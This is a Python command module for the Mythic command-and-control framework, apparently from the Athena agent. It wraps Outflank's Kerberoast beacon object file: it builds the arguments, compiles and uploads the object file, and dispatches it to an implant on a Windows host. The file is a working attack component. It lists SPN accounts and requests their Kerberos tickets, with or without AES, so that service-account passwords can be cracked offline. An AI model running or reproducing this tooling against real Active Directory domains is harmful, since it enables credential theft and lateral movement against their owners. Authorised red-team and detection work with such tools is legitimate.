from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..athena_utils.mythicrpc_utilities import *
from ..athena_utils.bof_utilities import *
import json

class KerberoastArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.String,
                description="Action to perform [list, list-no-aes, roast, roast-no-aes]",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=0,
                        required=True,
                        default_value=""
                        )
                ],
            ),
            CommandParameter(
                name="user",
                type=ParameterType.String,
                description="The user to roast or * for all",
                default_value="*",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True,
                        )
                ],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
        else:
            raise ValueError("Missing arguments")
    
    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)



    

class KerberoastCommand(CoffCommandBase):
    cmd = "kerberoast"
    needs_admin = False
    help_cmd = """
List SPN enabled accounts:
    kerberoast list

List SPN enabled accounts without AES Encryption:
    kerberoast list-no-aes

Roast all SPN enabled accounts:
    kerberoast roast

Roast all SPN enabled accounts without AES Encryption:
    kerberoast roast-no-aes

Roast a specific SPN enabled account:
    kerberoast roast <username>

Credit: The Outflank team for the original BOF - https://github.com/outflanknl/C2-Tool-Collection
    """
    description = "Perform Kerberoasting against all (or specified) SPN enabled accounts."
    version = 1
    script_only = True
    supported_ui_features = ["T1558.003"]
    author = "Cornelis de Plaa (@Cn33liz)"
    argument_class = KerberoastArguments
    attackmapping = []
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        # Ensure architecture compatibility
        if taskData.Callback.Architecture != "x64":
            raise Exception("BOFs are currently only supported on x64 architectures.")

        # Prepare arguments
        action = taskData.args.get_arg("action")
        user = taskData.args.get_arg("user")

        args_list = [generateWString(action)]
        if user:
            args_list.append(generateWString(user))

        encoded_args = base64.b64encode(SerializeArgs(args_list)).decode()

        # Compile and upload the BOF
        file_id = await compile_and_upload_bof_to_mythic(
            taskData.Task.ID,
            "outflank_bofs/kerberoast",
            f"kerberoast.{taskData.Callback.Architecture}.o"
        )

        # Create the subtask
        subtask = await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                taskData.Task.ID,
                CommandName="coff",
                SubtaskCallbackFunction="coff_completion_callback",
                Params=json.dumps({
                    "coffFile": file_id,
                    "functionName": "go",
                    "arguments": encoded_args,
                    "timeout": "60",
                }),
                Token=taskData.Task.TokenID,
            )
        )

        return response


    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
